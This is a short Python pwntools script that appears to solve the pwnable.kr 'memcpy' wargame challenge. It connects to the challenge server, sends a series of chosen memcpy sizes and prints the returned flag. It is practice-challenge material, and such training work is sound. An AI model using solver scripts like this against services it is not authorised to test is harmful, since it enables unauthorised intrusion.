from pwn import *

# connect
proc = remote("pwnable.kr", 9022)

print proc.recvuntil("No fancy hacking, I promise :D")

# input memcpy amount
with log.progress("Input memcpy amount", "0%") as p:
    amounts = [8, 16, 32, 64+8, 128+8, 256+8, 512+8, 1024+8, 2048+8, 4096]
    for idx in range(amounts.__len__()):
        print proc.recvuntil(" : ", True)
        proc.sendline(str(amounts[idx]))
        p.status(str((idx+1)*10) + "%")

# receive experiment result
print proc.recvuntil("flag : ", True)
log.success("flag{{{flag}}}".format(flag=proc.recvline(False)))

# disconnect
proc.close()
